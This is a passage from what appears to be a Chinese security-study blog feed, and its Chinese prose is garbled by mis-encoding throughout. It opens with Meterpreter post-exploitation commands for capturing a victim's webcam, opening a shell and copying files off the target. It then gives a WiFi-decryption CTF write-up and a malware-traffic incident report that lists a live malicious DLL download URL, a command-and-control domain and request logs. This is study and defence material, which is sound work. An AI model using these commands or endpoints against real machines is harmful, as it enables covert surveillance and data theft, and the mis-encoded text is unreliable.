plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ‰æ²¡æœ‰æ‘„åƒå¤´</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure><p>æ‹æ‘„</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><p>å¼€å¯ç›´æ’­<br><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>è¿›å…¥ç›®æ ‡æœº<code>Shell</code></p><h2 id="æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"><a href="#æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwd # ç›®æ ‡æœºç›®å½•</span><br><span class="line">get lwd # æŸ¥çœ‹å½“å‰å¤„äºæœ¬åœ°å“ªä¸ªç›®å½•</span><br><span class="line">ls</span><br><span class="line">cd </span><br><span class="line">search -f *.txt -d c:\ # æŸ¥çœ‹Cç›˜ä¸­æ‰€æœ‰ä»¥.txtä¸ºæ‹“å±•åçš„æ–‡ä»¶</span><br><span class="line">download c:\xxx /root # å°†ç‰¹å®šæ–‡ä»¶ä¸‹è½½</span><br><span class="line">upload /root c: # å°†æ–‡ä»¶ä¸Šä¼ </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Information-gathering&quot;&gt;&lt;a href=&quot;#Information-gathering&quot; class=&quot;headerlink&quot; title=&quot;Information gathering&quot;&gt;&lt;/a&gt;Information gathering&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>è¢«åŠ å¯†çš„WIFI</title>
    <link href="https://2in9ya2.github.io/20240414-Traffic/"/>
    <id>https://2in9ya2.github.io/20240414-Traffic/</id>
    <published>2024-04-14T07:26:58.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-14-çœ‹é›ªCTF-Misc-è¢«åŠ å¯†çš„WIFI"><a href="#2024-04-14-çœ‹é›ªCTF-Misc-è¢«åŠ å¯†çš„WIFI" class="headerlink" title="2024-04-14 çœ‹é›ªCTF Misc è¢«åŠ å¯†çš„WIFI"></a>2024-04-14 çœ‹é›ªCTF Misc è¢«åŠ å¯†çš„WIFI</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="WLANæœåŠ¡ä»‹ç»"><a href="#WLANæœåŠ¡ä»‹ç»" class="headerlink" title="WLANæœåŠ¡ä»‹ç»"></a>WLANæœåŠ¡ä»‹ç»</h3><p>WLANï¼ˆWireless Local Area Networkï¼Œæ— çº¿å±€åŸŸç½‘ï¼‰æœåŠ¡æ˜¯ä¸€ç§æ— çº¿ç½‘ç»œæŠ€æœ¯ï¼Œç”¨äºåœ¨å±€åŸŸç½‘èŒƒå›´å†…æä¾›æ— çº¿è¿æ¥ã€‚å®ƒé€šè¿‡æ— çº¿ä¿¡å·ä¼ è¾“æ•°æ®ï¼Œä½¿è®¾å¤‡èƒ½å¤Ÿåœ¨èŒƒå›´å†…è¿›è¡Œé€šä¿¡å’Œå…±äº«èµ„æºï¼Œè€Œæ— éœ€ä½¿ç”¨ä¼ ç»Ÿçš„æœ‰çº¿è¿æ¥</p><h3 id="å¸¸ç”¨æœ¯è¯­-1"><a href="#å¸¸ç”¨æœ¯è¯­-1" class="headerlink" title="å¸¸ç”¨æœ¯è¯­[1]"></a>å¸¸ç”¨æœ¯è¯­[1]</h3><ul><li>å®¢æˆ·ç«¯<br>å¸¦æœ‰æ— çº¿ç½‘å¡çš„PCæˆ–ä¾¿æºå¼ç¬”è®°æœ¬ç”µè„‘ç­‰ç»ˆç«¯</li><li>APï¼ˆAccess Pointï¼Œæ¥å…¥ç‚¹ï¼‰<br>APæä¾›æ— çº¿å®¢æˆ·ç«¯åˆ°å±€åŸŸç½‘çš„æ¡¥æ¥åŠŸèƒ½ï¼Œåœ¨æ— çº¿å®¢æˆ·ç«¯ä¸æ— çº¿å±€åŸŸç½‘ä¹‹é—´è¿›è¡Œæ— çº¿åˆ°æœ‰çº¿å’Œæœ‰çº¿åˆ°æ— çº¿çš„å¸§è½¬æ¢</li><li>ACï¼ˆAccess Controllerï¼Œæ— çº¿æ§åˆ¶å™¨ï¼‰<br>æ— çº¿æ§åˆ¶å™¨å¯¹æ— çº¿å±€åŸŸç½‘ä¸­çš„æ‰€æœ‰APè¿›è¡Œæ§åˆ¶å’Œç®¡ç†ã€‚æ— çº¿æ§åˆ¶å™¨è¿˜å¯ä»¥é€šè¿‡åŒè®¤è¯æœåŠ¡å™¨äº¤äº’ä¿¡æ¯ï¼Œæ¥ä¸ºWLANç”¨æˆ·æä¾›è®¤è¯æœåŠ¡</li><li>FAT AP<br>ä¸€ç§æ§åˆ¶å’Œç®¡ç†æ— çº¿å®¢æˆ·ç«¯çš„æ— çº¿è®¾å¤‡ã€‚å¸§åœ¨å®¢æˆ·ç«¯å’ŒLANä¹‹é—´ä¼ è¾“éœ€è¦ç»è¿‡æ— çº¿åˆ°æœ‰çº¿ä»¥åŠæœ‰çº¿åˆ°æ— çº¿çš„è½¬æ¢ï¼Œè€ŒFAT APåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­èµ·åˆ°äº†æ¡¥æ¢çš„ä½œç”¨</li><li>æ— çº¿ä»‹è´¨<br>æ— çº¿ä»‹è´¨æ˜¯ç”¨äºåœ¨æ— çº¿ç”¨æˆ·é—´ä¼ è¾“å¸§çš„ä»‹è´¨ã€‚WLANç³»ç»Ÿä½¿ç”¨æ— çº¿å°„é¢‘ä½œä¸ºä¼ è¾“ä»‹è´¨</li></ul><h3 id="äº¤äº’è¿‡ç¨‹-2"><a href="#äº¤äº’è¿‡ç¨‹-2" class="headerlink" title="äº¤äº’è¿‡ç¨‹[2]"></a>äº¤äº’è¿‡ç¨‹[2]</h3><p>  <img src="/images/20240414-Traffic/image.png"></p><h3 id="WLANæ‰«ææ–¹å¼"><a href="#WLANæ‰«ææ–¹å¼" class="headerlink" title="WLANæ‰«ææ–¹å¼"></a>WLANæ‰«ææ–¹å¼</h3><ul><li><p>è¢«åŠ¨æ‰«æï¼š</p><ul><li>è¢«åŠ¨æ‰«ææ˜¯æŒ‡æ— çº¿è®¾å¤‡åœ¨æ¥æ”¶æ¨¡å¼ä¸‹ç›‘å¬æ— çº¿ä¿¡é“ï¼Œè®°å½•å‘¨å›´æ‰€æœ‰å‘é€ä¿¡å·çš„ä¿¡æ¯ã€‚</li><li>å½“è®¾å¤‡å¤„äºè¢«åŠ¨æ‰«ææ¨¡å¼æ—¶ï¼Œå®ƒåªæ˜¯æ”¶é›†é™„è¿‘æ— çº¿ç½‘ç»œçš„ä¿¡æ¯ï¼Œè€Œä¸å‘é€ä»»ä½•è¯·æ±‚ã€‚</li><li>è¢«åŠ¨æ‰«æé€šå¸¸ç”¨äºæ— çº¿ç½‘ç»œç®¡ç†ã€ç›‘è§†å’Œæ•°æ®æ”¶é›†ã€‚</li></ul></li><li><p>ä¸»åŠ¨æ‰«æï¼š</p><ul><li>ä¸»åŠ¨æ‰«ææ˜¯æŒ‡æ— çº¿è®¾å¤‡å‘é€ç‰¹æ®Šçš„æ‰«æè¯·æ±‚ä¿¡å·ï¼Œä»¥æœç´¢é™„è¿‘çš„æ— çº¿ç½‘ç»œã€‚</li><li>åœ¨ä¸»åŠ¨æ‰«æä¸­ï¼Œè®¾å¤‡ä¼šå¹¿æ’­ä¸€ä¸ªæ‰«æè¯·æ±‚ï¼Œå‘¨å›´çš„æ— çº¿æ¥å…¥ç‚¹ï¼ˆAPï¼‰ä¼šæ”¶åˆ°è¯·æ±‚å¹¶å›å¤åŒ…å«å®ƒä»¬çš„SSIDï¼ˆæœåŠ¡é›†æ ‡è¯†ç¬¦ï¼‰å’Œå…¶ä»–ä¿¡æ¯çš„ä¿¡æ ‡å¸§ã€‚</li><li>è®¾å¤‡æ ¹æ®æ¥æ”¶åˆ°çš„å“åº”ç¡®å®šå¯ç”¨çš„æ— çº¿ç½‘ç»œï¼Œå¹¶æ˜¾ç¤ºç»™ç”¨æˆ·æˆ–è‡ªåŠ¨è¿æ¥åˆ°æœ€é€‚åˆçš„ç½‘ç»œã€‚</li></ul></li></ul><h3 id="AP"><a href="#AP" class="headerlink" title="AP"></a>AP</h3><p>APï¼ˆæ¥å…¥ç‚¹ï¼‰ä½œä¸ºæ— çº¿å±€åŸŸç½‘ï¼ˆWLANï¼‰çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ä¼šæ‰§è¡Œå¤šé¡¹ä»»åŠ¡ä»¥ç¡®ä¿ç½‘ç»œçš„ç¨³å®šæ€§ã€æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚é¦–å…ˆï¼Œå®ƒä¼šå®šæœŸå¹¿æ’­ä¿¡æ ‡å¸§ï¼Œé€šçŸ¥é™„è¿‘è®¾å¤‡ç½‘ç»œçš„å­˜åœ¨å’ŒåŸºæœ¬ä¿¡æ¯ï¼Œå¸®åŠ©è®¾å¤‡æ‰¾åˆ°å¹¶è¿æ¥åˆ°è¯¥ç½‘ç»œã€‚åŒæ—¶ï¼ŒAPä¼šç›‘è§†è¿æ¥çŠ¶æ€å’Œä¿¡é“è´¨é‡ï¼Œå®šæœŸæ£€æŸ¥è¿æ¥è®¾å¤‡çš„çŠ¶æ€å¹¶ç»´æŒè¿æ¥çš„ç¨³å®šæ€§ï¼Œä»¥åŠç›‘è§†æ‰€åœ¨ä¿¡é“çš„è´¨é‡å¹¶æ ¹æ®éœ€è¦è°ƒæ•´é€šä¿¡å‚æ•°ã€‚æ­¤å¤–ï¼ŒAPä¼šå®šæœŸæ›´æ–°é…ç½®ä¿¡æ¯ï¼Œä»ç½‘ç»œç®¡ç†ç³»ç»Ÿè·å–æœ€æ–°çš„è®¾ç½®å’Œå®‰å…¨ç­–ç•¥ï¼Œå¹¶æ‰§è¡Œæ¼«æ¸¸å†³ç­–ä»¥æä¾›æœ€ä½³çš„ç”¨æˆ·ä½“éªŒã€‚æœ€åï¼ŒAPè¿˜ä¼šå®šæœŸç›‘è§†ç½‘ç»œå®‰å…¨æ€§ï¼Œç¡®ä¿ç½‘ç»œæ²¡æœ‰å¼‚å¸¸æ´»åŠ¨æˆ–æ½œåœ¨çš„å®‰å…¨å¨èƒã€‚ç»¼ä¸Šæ‰€è¿°ï¼ŒAPé€šè¿‡æ‰§è¡Œè¿™äº›ä»»åŠ¡ï¼Œæœ‰æ•ˆåœ°ç®¡ç†å’Œç»´æŠ¤ WLANï¼Œä»¥æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚å¹¶æä¾›å¯é çš„æ— çº¿è¿æ¥ã€‚</p><h3 id="å¹¿æ’­æµé‡"><a href="#å¹¿æ’­æµé‡" class="headerlink" title="å¹¿æ’­æµé‡"></a>å¹¿æ’­æµé‡</h3><p>åˆ©ç”¨å‘½ä»¤<code>wlan.fc.type_subtype == 0x08</code>è¿‡æ»¤å‡ºWLANæµé‡çš„å¹¿æ’­åŒ…<br><img src="/images/20240414-Traffic/image-1.png"></p><h3 id="WLANè®¤è¯æ–¹å¼"><a href="#WLANè®¤è¯æ–¹å¼" class="headerlink" title="WLANè®¤è¯æ–¹å¼"></a>WLANè®¤è¯æ–¹å¼</h3><ol><li>å¼€æ”¾ç³»ç»Ÿè®¤è¯ï¼ˆOpen System Authenticationï¼‰ï¼šè¿™æ˜¯æœ€åŸºæœ¬çš„è®¤è¯æ–¹å¼ï¼Œè®¾å¤‡å¯ä»¥è¿æ¥åˆ°ç½‘ç»œè€Œæ— éœ€æä¾›ä»»ä½•å‡­æ®ã€‚å®ƒæä¾›äº†æœ€ä½çº§åˆ«çš„å®‰å…¨æ€§ï¼Œå› ä¸ºä»»ä½•è®¾å¤‡éƒ½å¯ä»¥è¿æ¥åˆ°ç½‘ç»œã€‚<br><img src="/images/20240414-Traffic/image-2.png"></li><li>å…±äº«å¯†é’¥è®¤è¯ï¼ˆShared Key Authenticationï¼‰ï¼šåœ¨è¿™ç§è®¤è¯æ–¹å¼ä¸­ï¼Œæ¥å…¥ç‚¹è¦æ±‚è¿æ¥çš„è®¾å¤‡æä¾›ä¸æ¥å…¥ç‚¹é¢„å…ˆå…±äº«çš„å¯†é’¥è¿›è¡Œè®¤è¯ã€‚è™½ç„¶è¿™æ¯”å¼€æ”¾ç³»ç»Ÿè®¤è¯æä¾›äº†ä¸€å®šç¨‹åº¦çš„å®‰å…¨æ€§ï¼Œä½†å®ƒå·²è¢«è¯æ˜æ˜¯ä¸å®‰å…¨çš„ï¼Œå¹¶å·²ä¸æ¨èä½¿ç”¨ã€‚<br><img src="/images/20240414-Traffic/image-3.png"></li><li>WPA&#x2F;WPA2-PSKï¼ˆWi-Fi Protected Access Pre-Shared Keyï¼‰ï¼šè¿™æ˜¯ä¸€ç§åŸºäºé¢„å…±äº«å¯†é’¥çš„ä¸ªäººçº§åˆ«çš„è®¤è¯æ–¹å¼ã€‚ç”¨æˆ·åœ¨è¿æ¥åˆ°ç½‘ç»œä¹‹å‰éœ€è¦è¾“å…¥é¢„å…±äº«å¯†é’¥ï¼ˆä¹Ÿç§°ä¸ºå¯†ç ï¼‰ã€‚WPA&#x2F;WPA2-PSK æä¾›äº†æ›´å¼ºçš„å®‰å…¨æ€§ï¼Œå› ä¸ºé€šä¿¡è¿‡ç¨‹ä¸­ä½¿ç”¨äº†åŠ å¯†çš„ä¼šè¯å¯†é’¥ã€‚</li></ol><ul><li>WPA&#x2F;WPA2-PSKï¼ˆPre-Shared Keyï¼‰ï¼š<ul><li>è¿™æ˜¯ä¸ªäººçº§åˆ«çš„è®¤è¯æ–¹å¼ï¼Œä¹Ÿç§°ä¸ºWPA-PSKæˆ–WPA2-PSKã€‚</li><li>ç”¨æˆ·éœ€è¦åœ¨è¿æ¥åˆ°ç½‘ç»œä¹‹å‰è¾“å…¥é¢„å…±äº«å¯†é’¥ï¼ˆä¹Ÿç§°ä¸ºå¯†ç ï¼‰ã€‚</li><li>é¢„å…±äº«å¯†é’¥ç”¨äºç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œç”¨äºåŠ å¯†æ•°æ®ä¼ è¾“ã€‚</li><li>WPA2-PSKç›¸æ¯”WPA-PSKæä¾›äº†æ›´å¼ºå¤§çš„åŠ å¯†ç®—æ³•ï¼Œå¦‚AESï¼ˆAdvanced Encryption Standardï¼‰ã€‚</li></ul></li></ul><ol start="4"><li>MACåœ°å€è¿‡æ»¤ï¼šåœ¨è¿™ç§è®¤è¯æ–¹å¼ä¸­ï¼Œæ¥å…¥ç‚¹æ ¹æ®è®¾å¤‡çš„MACåœ°å€æ¥æ§åˆ¶å…è®¸è¿æ¥åˆ°ç½‘ç»œçš„è®¾å¤‡ã€‚åªæœ‰åœ¨æ¥å…¥ç‚¹å…è®¸çš„è®¾å¤‡MACåœ°å€åˆ—è¡¨ä¸­çš„è®¾å¤‡æ‰èƒ½è¿æ¥åˆ°ç½‘ç»œã€‚<br><img src="/images/20240414-Traffic/image-4.png"><br>å…¶ä»–æ–¹å¼è¯·è‡ªè¡ŒæŸ¥è¯¢</li></ol><h3 id="WLANå…³è”"><a href="#WLANå…³è”" class="headerlink" title="WLANå…³è”"></a>WLANå…³è”</h3><p>è®¾å¤‡å‘é€‰æ‹©çš„æ¥å…¥ç‚¹å‘é€å…³è”è¯·æ±‚ï¼Œè¯·æ±‚åŠ å…¥ç½‘ç»œï¼Œæ¥å…¥ç‚¹å¯¹è¯·æ±‚è¿›è¡Œèº«ä»½éªŒè¯å’Œè®¤è¯ï¼Œå¹¶åœ¨æˆåŠŸåä¸ºè®¾å¤‡åˆ†é…IPåœ°å€ã€‚ä¸€æ—¦ç¡®è®¤å“åº”æ”¶åˆ°ï¼Œå…³è”å®Œæˆï¼Œè®¾å¤‡ä¾¿å¯ä»¥åœ¨æ— çº¿ç½‘ç»œä¸­è¿›è¡Œæ•°æ®ä¼ è¾“å’Œé€šä¿¡ã€‚<br>å½“æ¥å…¥ç‚¹ï¼ˆAPï¼‰æ”¶åˆ°å…³è”è¯·æ±‚ï¼ˆAssociation Requestï¼‰æ—¶ï¼Œé¦–å…ˆä¼šéªŒè¯è¯·æ±‚çš„æœ‰æ•ˆæ€§ï¼ŒåŒ…æ‹¬èº«ä»½éªŒè¯ä¿¡æ¯å’Œè®¤è¯æ–¹å¼ã€‚æ¥ç€ï¼ŒAPä¼šæ£€æŸ¥è¯·æ±‚ä¸­çš„ä¼‘çœ å‚æ•°ï¼Œå¦‚Listen Intervalï¼Œä»¥äº†è§£STAçš„ä¼‘çœ æ¨¡å¼ï¼Œå¹¶æ ¹æ®éœ€è¦å¤„ç†å¸§çš„å­˜å‚¨å’Œè½¬å‘ã€‚å¦‚æœAPæœ‰è¶³å¤Ÿçš„èµ„æºæ¥å¤„ç†æ–°çš„å…³è”è¯·æ±‚ï¼Œå®ƒå°†ä¸ºSTAåˆ†é…èµ„æºå¹¶æš‚å­˜ä»»ä½•éœ€è¦å‘é€ç»™STAçš„å¸§ã€‚ç„¶åï¼ŒAPä¼šå‘é€å…³è”å“åº”ï¼ˆAssociation Responseï¼‰ï¼Œå¦‚æœæˆåŠŸå¤„ç†äº†å…³è”è¯·æ±‚ï¼Œå®ƒä¼šæŒ‡ç¤ºSTAå¯ä»¥æˆåŠŸè¿æ¥åˆ°ç½‘ç»œã€‚ç„¶è€Œï¼Œå¦‚æœAPæ— æ³•ä¸ºSTAåˆ†é…è¶³å¤Ÿçš„èµ„æºï¼Œå®ƒå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå¤±è´¥çš„å…³è”å“åº”ï¼ŒæŒ‡ç¤ºè¿æ¥å¤±è´¥ã€‚åœ¨å¤„ç†å…³è”è¯·æ±‚æ—¶ï¼ŒAPéœ€è¦å¹³è¡¡èµ„æºå®¹é‡å’Œç½‘ç»œæ€§èƒ½ï¼Œä»¥ç¡®ä¿ä¸ºæ‰€æœ‰è¿æ¥çš„STAæä¾›è¶³å¤Ÿçš„èµ„æºå’ŒæœåŠ¡ã€‚</p><h3 id="WLANå…³è”æˆæœåå››æ¬¡æ¡æ‰‹"><a href="#WLANå…³è”æˆæœåå››æ¬¡æ¡æ‰‹" class="headerlink" title="WLANå…³è”æˆæœåå››æ¬¡æ¡æ‰‹"></a>WLANå…³è”æˆæœåå››æ¬¡æ¡æ‰‹</h3><p><a href="https://kysonlok.gitbook.io/blog/wireless/4_way_handshake">WiFi å››æ¬¡æ¡æ‰‹åˆ†æ</a></p><h2 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h2><p>é€šè¿‡æŸ¥çœ‹<code>HTTP</code>æµï¼Œå‘ç°å…¶ä¼ è¾“äº†å¯†ç ï¼Œåšä¸»è¿æ°”å¥½ï¼Œåªçœ‹äº†ä¸€æ¡æµï¼Œå°±çœ‹åˆ°äº†å¯†ç <br><img src="/images/20240414-Traffic/image-5.png"></p><p>åˆ©ç”¨<code>airdecap.ng</code>å·¥å…·å¯¹<code>pcap</code>åŒ…è¿›è¡Œè§£å¯†<br><img src="/images/20240414-Traffic/image-7.png"></p><p>ä¹‹åå¯¹è§£å¯†åçš„åŒ…è¿›è¡Œåˆ†æï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è—åœ¨å›¾ç‰‡é‡Œï¼Œæˆ–è€…å…¶ä»–æ–‡ä»¶é‡Œï¼Œæ‰¾äº†ä¸€åœˆå‘ç°æ²¡æœ‰<br><img src="/images/20240414-Traffic/image-8.png"></p><p>é‚£å°±ç›´æ¥æœç´¢<code>flag</code>ï¼Œè¿˜çœŸæœ‰<br><img src="/images/20240414-Traffic/image-9.png"><br><img src="/images/20240414-Traffic/image-10.png"></p><p>å¯¹<code>flag%7Buse_a_strong_pass%7D</code>è¿›è¡Œè§£ç å¾—åˆ°<code>flag&#123;use_a_strong_pass&#125;</code><br><img src="/images/20240414-Traffic/image-11.png"><br>å˜¿å˜¿ï¼Œå¯¹äº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºå¾ˆå¤æ‚å‘¢ï¼Œä¸‹é¢è¿™ä¸ªæ˜¯åœ¨æœç´¢è¿‡ç¨‹ä¸­å‘ç°çš„ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥çœ‹ä¸€çœ‹<br><a href="https://blog.csdn.net/weixin_41603028/article/details/103812261">ä¸€é“å…³äºæ— çº¿ç½‘ç»œå’Œéšå†™çš„CTF</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>[1]<a href="https://www.h3c.com/cn/d_200812/622875_473262_0.htm">https://www.h3c.com/cn/d_200812/622875_473262_0.htm</a><br>[2]<a href="https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148">https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148</a><br>[3]<a href="https://blog.csdn.net/random_run/article/details/115223124">https://blog.csdn.net/random_run/article/details/115223124</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-14-çœ‹é›ªCTF-Misc-è¢«åŠ å¯†çš„WIFI&quot;&gt;&lt;a href=&quot;#2024-04-14-çœ‹é›ªCTF-Misc-è¢«åŠ å¯†çš„WIFI&quot; class=&quot;headerlink&quot; title=&quot;2024-04-14 çœ‹é›ªCTF Misc è¢«åŠ å¯†çš„WIFI&quot;&gt;&lt;/a&gt;2024-04-14 çœ‹é›ªCTF Misc è¢«åŠ å¯†çš„WIFI&lt;/h1&gt;</summary>
    
    
    
    <category term="traffic_analysis" scheme="https://2in9ya2.github.io/categories/traffic-analysis/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="ctf" scheme="https://2in9ya2.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT&#39;S GOING ON?)</title>
    <link href="https://2in9ya2.github.io/20200612-Malware/"/>
    <id>https://2in9ya2.github.io/20200612-Malware/</id>
    <published>2024-04-14T02:02:44.000Z</published>
    <updated>2025-08-25T07:52:22.811Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHATâ€™S-GOING-ON"><a href="#2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHATâ€™S-GOING-ON" class="headerlink" title="2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHATâ€™S GOING ON?)"></a>2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHATâ€™S GOING ON?)</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆæŸ¥çœ‹<code>HTTP</code>æµï¼Œç„¶åè¿½è¸ªç¬¬ä¸€æ¡æµ</p><p><img src="/images/20200612-Malware/2024-04-14-10-08-42-image.png"></p><p>æç¤º<code>document</code>è¢«è½¬ç§»ï¼ŒçŒœæµ‹ç”¨æˆ·è®¿é—®<code>http://cardboardspaceshiptoys.com/logs/invoice-86495.doc</code>åï¼Œåˆç‚¹å‡»<code>https://cardboardspaceshiptoys.com/logs/invoice-86495.doc</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-09-18-image.png"></p><p>éšåè¿½è¸ªåä¸¤æ¡<code>HTTP</code>æµ</p><p><img src="/images/20200612-Malware/2024-04-14-10-11-14-image.png"></p><p>å‘ç°åœ¨<code>GET http://205.185.125.104/files/june11.dll</code>åï¼Œå“åº”äº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="/images/20200612-Malware/2024-04-14-10-12-00-image.png"></p><p>éšåå¯¹<code>http://snnmnkxdhflwgthqismb.com/post.php</code>è¿›è¡Œäº†ä¸€ç³»åˆ—<code>POST REQUEST</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-15-07-image.png"></p><p>åˆ©ç”¨<code>virustotal</code>æŸ¥è¯¢åŸŸå<code>snnmnkxdhflwgthqismb.com</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-17-04-image.png"></p><p>åœ¨è™šæ‹Ÿæœºä¸­å¯¼å‡º.dllæ–‡ä»¶ï¼Œå¹¶è®¡ç®—å…¶sha256å€¼ï¼Œå¹¶è¿›è¡ŒæŸ¥è¯¢ï¼Œå…¶ä¸ºæ¶æ„è½¯ä»¶</p><p><img src="/images/20200612-Malware/2024-04-14-10-21-34-image.png"></p><h3 id="åŠ å¯†æµ"><a href="#åŠ å¯†æµ" class="headerlink" title="åŠ å¯†æµ"></a>åŠ å¯†æµ</h3><p>åˆ©ç”¨<code>tls.handshake.type eq 1</code>è¿‡æ»¤æ¡ä»¶æŸ¥è¯¢æ¡æ‰‹ä¿¡æ¯ï¼Œå¥½åƒæ²¡ä»€ä¹ˆä¿¡æ¯<img src="/images/20200612-Malware/2024-04-14-10-26-34-image.png"></p><h3 id="çº¿ç´¢æ¢³ç†"><a href="#çº¿ç´¢æ¢³ç†" class="headerlink" title="çº¿ç´¢æ¢³ç†"></a>çº¿ç´¢æ¢³ç†</h3><ul><li>Environmentï¼ˆè°ƒæŸ¥çš„èµ„äº§ä¿¡æ¯&#x2F;ç¯å¢ƒï¼‰<ul><li>LAN segment range:10.6.12.0&#x2F;24 </li><li>Domain:frank-n-ted.com</li><li>Domain controller:frank-n-ted-dc-10.6.12.12</li><li>LAN segment gateway:10.6.12.1</li><li>LAN segment broadcast address:10.6.12.255</li></ul></li><li>Incident Report<ul><li><p>Executive summary:</p><p>LAPTOP-5WKHX9YGçš„ç”¨æˆ·frank.brokowskiè®¿é—®<a href="http://205.185.125.104/files/june11.dll%E8%A2%AB%E6%84%9F%E6%9F%93">http://205.185.125.104/files/june11.dllè¢«æ„ŸæŸ“</a></p></li><li><p>Victim details</p><ul><li>IP address:10.6.12.203</li><li>MAC address:Intel_6d:fc:e2 (84:3a:4b:6d:fc:e2)</li><li>User account name:frank.brokowsk</li></ul></li><li><p>Indicators of compromise (IOCs)</p><ul><li>SHA256 hash:d36366666b407fe5527b96696377ee7ba9b609c8ef4561fa76af218ddd764dec</li><li>File size:563,032 å­—èŠ‚</li><li>File name:june11.dll</li><li>File location:<a href="http://205.185.125.104/files/june11.dll">http://205.185.125.104/files/june11.dll</a></li><li>File description:æ¶æ„ç¨‹åº</li></ul></li><li><p>HTTP traffic to retrieve the malware</p><p>3302    2020-06-13 01:15:19.658851    10.6.12.203    205.185.125.104    HTTP    205.185.125.104    GET &#x2F;files&#x2F;june11.dll HTTP&#x2F;1.1     http (80)    49739 (49739)        312        Intel_6d:fc:e2    Cisco_29:41:7d</p></li><li><p>HTTP traffic for remote request infection activity</p><p>4228    2020-06-13 01:17:09.848132    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49743 (49743)        713        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4237    2020-06-13 01:17:10.374922    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49744 (49744)        749        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4632    2020-06-13 01:17:12.291210    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49747 (49747)        646        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4633    2020-06-13 01:17:12.291276    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49746 (49746)        584        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4638    2020-06-13 01:17:12.291811    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49748 (49748)        579        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4645    2020-06-13 01:17:12.293078  